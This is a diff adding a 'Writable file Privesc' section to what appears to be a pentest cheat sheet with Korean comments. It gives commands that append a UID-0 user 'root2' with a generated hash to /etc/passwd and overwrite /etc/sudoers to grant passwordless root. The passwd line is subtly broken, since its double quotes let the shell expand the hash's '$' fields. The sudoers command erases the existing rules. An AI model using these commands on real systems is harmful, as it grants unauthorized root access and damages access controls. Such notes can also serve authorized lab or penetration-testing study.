@@ -641,3 +641,28 @@ rlogin -l root <target>
 - https://gtfobins.org/gtfobins/docker/
 	
 </details>
+
+---
+<details>
+	<summary><strong>Writable file Privesc</strong></summary>
+
+## /etc/passwd
+```bash
+# 패스워드 해시 생성
+openssl passwd -6 root
+# Output: $6$RoXDQMH.jE6LkB4g$wEnZ3o8kvX5a1R4M40Rn5/wQ6oNBV719KBgOuhSs7MSJTVN88L6DOayF7iKqxlK4ILbp3nxSA4ZaUsM9VBUDS.
+
+# /etc/passwd에 새로운 root 사용자 추가
+echo "root2:$6$RoXDQMH.jE6LkB4g$wEnZ3o8kvX5a1R4M40Rn5/wQ6oNBV719KBgOuhSs7MSJTVN88L6DOayF7iKqxlK4ILbp3nxSA4ZaUsM9VBUDS.:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+# root2로 전환
+su root2
+Password: root 
+```
+
+## sudoers
+```bash
+echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+```
+
+</details>
